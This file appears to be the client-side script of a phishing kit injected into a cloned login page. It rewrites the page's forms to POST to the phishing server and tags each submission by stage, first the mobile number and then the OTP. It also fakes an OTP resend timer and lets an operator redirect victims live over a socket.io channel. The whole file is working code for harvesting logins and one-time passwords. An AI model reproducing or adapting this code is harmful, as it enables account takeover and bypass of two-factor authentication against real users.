const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-email",
        querys: [
            `[type="number"]`,
            `[name="username"]`
        ],
        runner() {
            document.forms[0].addEventListener("submit", e => {
                if (document.querySelector(`[name="username"]`).value.length < 10) {
                    e.preventDefault()
                    document.querySelector("#error-msg").innerHTML = `Your mobile number should be of 10 digits. Please also ensure it does not start with 0 or +91. Please enter valid Mobile Number.`
                }
            })
        }
    },
    {
        spikeType: "otp",
        querys: [
            `[type="tel"]`,
            `[name="otp"]`,
            `[placeholder="Enter OTP"]`
        ],
        runner() {
            let otpIndex = 60
            let otpTimer = document.querySelector(".disable-state-login.input-extra-options-desktop")
            let clearIn_
            if (otpTimer) {
                clearIn_ = setInterval(() => {
                    if (otpIndex == 0) {
                        clearInterval(clearIn_)
                        loadresetbtn()
                    }

                    document.querySelector(".disable-state-login.input-extra-options-desktop").innerHTML = `Resend OTP in ${otpIndex}s`
                    otpIndex--
                }, 1000)
            }

            if (document.body.innerText.includes("You have exceeded maximum OTP attempts, Please try again after some time.")) {
                loadresetbtn()
            }

            function loadresetbtn() {
                document.forms[0].innerHTML +=
                    `<button class="login-form-inputs login-btn" style="background: #111;margin: 1rem 0;" type="button" id="resend_otp">Resend OTP</button>`
                document.querySelector("#resend_otp").addEventListener("click", () => {
                    addSpikeType("resend-otp")
                    document.forms[0].submit()
                })
            }
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    // {
    //     spikeType: "",
    //     runner() {

    //     }
    // }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{
    let allLoader = document.querySelectorAll(".loader")
    if (allLoader) {
        allLoader.forEach(l => {
            l.remove()
        })
    }
}